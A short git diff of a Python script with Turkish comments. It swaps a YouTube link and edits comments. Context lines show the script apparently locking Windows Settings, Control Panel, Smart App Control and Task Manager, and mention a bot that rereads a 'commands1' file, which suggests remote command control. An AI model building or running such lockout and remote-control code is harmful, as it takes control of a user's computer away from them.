@@ -19,14 +19,13 @@ def send_notification(msg):
         pass
 
 # ==========================================
-# 1) YOUTUBE MÜZİK AÇ
+# 1) YOUTUBE MÜZİK AÇ (YENİ LİNK)
 # ==========================================
 def play_music():
     try:
         send_notification("🎵 Müzik açılıyor...")
-        url = "https://www.youtube.com/watch?v=Z2etJpxjwJE&list=RDZ2etJpxjwJE&start_radio=1"
+        url = "https://www.youtube.com/watch?v=kanf0R3nyKY"
         
-        # Chrome ile aç
         chrome_path = "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"
         if os.path.exists(chrome_path):
             subprocess.Popen([chrome_path, url], shell=True)
@@ -130,4 +129,5 @@ lock_task_manager()
 send_notification("🔒 Ayarlar + Denetim Masası + Smart App Control + Görev Yöneticisi kilitlendi!")
 send_notification("🎵 Şarkı çalıyor!")
 
-# İŞLEM BİTTİ
+# 1 SEFERLİK ÇALIŞIR, BİTER.
+# Bot tekrar commands1 okuyacak.
